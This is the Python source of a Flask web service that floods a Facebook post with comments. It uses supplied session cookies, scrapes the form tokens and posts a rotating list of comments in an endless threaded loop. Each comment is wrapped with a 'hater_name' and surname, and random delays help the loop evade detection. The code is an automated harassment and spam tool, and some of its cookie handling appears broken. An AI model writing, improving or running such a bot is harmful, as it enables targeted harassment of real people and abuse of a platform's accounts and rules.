from flask import Flask, render_template, request, jsonify
import requests
import re
import time
import threading
import random
import string
from datetime import datetime

app = Flask(__name__)

# Global variables to manage tasks
active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        
    def stop_task(self):
        self.is_running = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status
        }
    
    def extract_post_id(self, url):
        """Extract post ID from Facebook URL"""
        patterns = [
            r'/posts/([^/?]+)',
            r'story_fbid=([0-9]+)',
            r'/([0-9]+)/?$',
            r'fbid=([0-9]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        return None

    def verify_cookies(self, cookies):
        """Check if cookies are valid"""
        try:
            response = requests.get(
                'https://mbasic.facebook.com/me',
                cookies={"cookie": cookies},
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=10
            )
            return 'logout.php' not in response.url and 'c_user' in cookies
        except:
            return False

    def send_comment(self, cookies, post_url, comment_text, hater_name, last_name):
        try:
            post_id = self.extract_post_id(post_url)
            if not post_id:
                self.last_status = "Invalid post URL"
                return False

            if not self.verify_cookies(cookies):
                self.last_status = "Invalid cookies - login failed"
                return False

            session = requests.Session()
            session.cookies.update({"cookie": cookies})
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
                'Referer': 'https://mbasic.facebook.com'
            })

            # Load post page
            response = session.get(f'https://mbasic.facebook.com/{post_id}')
            
            # Find comment form parameters
            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
            
            if not fb_dtsg or not jazoest:
                self.last_status = "Could not find comment form"
                return False

            # Prepare formatted comment
            formatted_comment = f"{hater_name} {comment_text} {last_name}"
            
            # Submit comment
            response = session.post(
                'https://mbasic.facebook.com/a/comment.php',
                data={
                    'fb_dtsg': fb_dtsg.group(1),
                    'jazoest': jazoest.group(1),
                    'comment_text': formatted_comment
                },
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )

            if response.status_code == 200:
                self.comment_count += 1
                self.last_status = f"Comment posted: {formatted_comment}"
                return True
            else:
                self.last_status = f"Failed with status {response.status_code}"
                return False

        except Exception as e:
            self.last_status = f"Error: {str(e)}"
            return False

    def run_task(self, config):
        try:
            cookies = config['cookies']
            post_url = config['post_url']
            comments = config['comments']
            delay = config['delay']
            hater_name = config['hater_name']
            last_name = config['last_name']
            
            comment_index = 0
            
            while self.is_running:
                current_comment = comments[comment_index % len(comments)]
                
                self.send_comment(
                    cookies, 
                    post_url, 
                    current_comment, 
                    hater_name, 
                    last_name
                )
                
                comment_index += 1
                time.sleep(delay + random.uniform(1, 3))  # Random delay
                
        except Exception as e:
            self.last_status = f"Task Error: {str(e)}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        data = request.json
        
        # Validate all required fields
        required_fields = ['cookies', 'post_url', 'hater_name', 'last_name', 'comments', 'delay']
        if not all(data.get(field) for field in required_fields):
            return jsonify({'status': 'error', 'message': 'All fields are required'})
        
        # Create task
        task_id = ''.join(random.choices(string.digits, k=8))
        config = {
            'cookies': data['cookies'].strip(),
            'post_url': data['post_url'].strip(),
            'hater_name': data['hater_name'].strip(),
            'last_name': data['last_name'].strip(),
            'comments': [c.strip() for c in data['comments'].split('\n') if c.strip()],
            'delay': max(5, int(data['delay']))  # Minimum 5 second delay
        }
        
        # Verify cookies first
        if not FacebookCommenter(task_id).verify_cookies(config['cookies']):
            return jsonify({'status': 'error', 'message': 'Invalid cookies - login failed'})
        
        # Start task
        commenter = FacebookCommenter(task_id)
        thread = threading.Thread(target=commenter.run_task, args=(config,))
        thread.daemon = True
        thread.start()
        
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': 'Task started successfully'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': 'Task stopped'})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/task_status/<task_id>')
def task_status(task_id):
    with task_lock:
        if task_id in active_tasks:
            return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
        return jsonify({'status': 'error', 'message': 'Task not found'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
